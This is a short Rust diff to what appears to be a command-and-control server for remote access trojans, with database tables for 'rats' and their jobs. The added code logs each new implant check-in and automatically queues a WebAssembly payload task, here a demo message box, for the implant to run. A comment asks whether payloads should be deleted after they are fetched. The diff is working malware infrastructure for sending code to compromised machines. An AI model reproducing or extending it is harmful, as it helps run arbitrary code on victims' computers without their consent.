@@ -101,6 +101,16 @@ impl CoreTask {
                 let pk_vec = Vec::from(*public_key);
                 sqlx::query!("INSERT INTO rats (public_key, first_seen, last_callback, alive) VALUES (?, datetime('now'), datetime('now'), true)", pk_vec).execute(&db_pool.writer).await.unwrap();
 
+                log::info!("New rat checked in with public key {:?}", public_key);
+
+                // TODO remove test code
+                let rat_id = sqlx::query!("SELECT rat_id FROM rats WHERE public_key = ?", pk_vec)
+                    .fetch_one(&db_pool.reader)
+                    .await
+                    .unwrap();
+                let payload = serialize(&server_to_rat::Task::WebAssemblyTask{ wasm: include_bytes!("../../../payloads/target/wasm32-unknown-unknown/debug/demo_messagebox.wasm").to_vec(), fn_name: "go".to_string()}).unwrap();
+                sqlx::query!("INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'task', ?)", rat_id.rat_id, payload).execute(&db_pool.writer).await.unwrap();
+
                 self.send_encrypted_response(
                     server_to_rat::Response::CheckinSuccessful,
                     reply_channel,
@@ -204,6 +214,7 @@ impl CoreTask {
                             }
                         };
 
+                        // TODO remove payload after job has been fetched?
                         sqlx::query!("UPDATE jobs SET started = true, last_update = datetime('now') WHERE job_id = ?", job.job_id).execute(&mut transaction).await.unwrap();
                         transaction.commit().await.unwrap();
 
